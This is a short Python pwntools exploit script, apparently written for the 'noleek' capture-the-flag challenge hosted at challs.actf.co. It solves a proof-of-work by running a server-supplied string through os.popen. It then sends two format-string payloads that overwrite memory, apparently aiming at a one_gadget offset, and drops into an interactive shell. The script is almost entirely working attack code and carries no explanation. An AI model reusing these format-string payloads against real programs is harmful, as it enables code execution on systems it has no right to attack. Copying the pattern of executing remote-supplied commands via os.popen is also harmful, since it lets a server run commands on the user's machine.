from pwn import *
import os

def solve_pow(conn):
    conn.recvuntil(b"proof of work: ")
    cmd = conn.recvline().decode().strip()
    log.info(cmd)
    sol = os.popen(cmd).read().strip()
    log.info(sol)
    conn.sendlineafter(b"solution: ", sol.encode())
    log.info("Done solving PoW.")

#One = 0xc9620

for i in range(100):
    log.info(f'Round {i}:')
    #io = process('./noleek_patched')
    #gdb.attach(io, api=True)
    io = remote('challs.actf.co', 31400)
    solve_pow(io)
    print(io.recvuntil(b'leek? '))
    io.sendline(b'%*1$d%56c%13$hn')
    print(io.recvuntil(b'leek? ', timeout=20))
    io.sendline(b'%13$hhn%*12$d%678166c%42$n')
    io.interactive()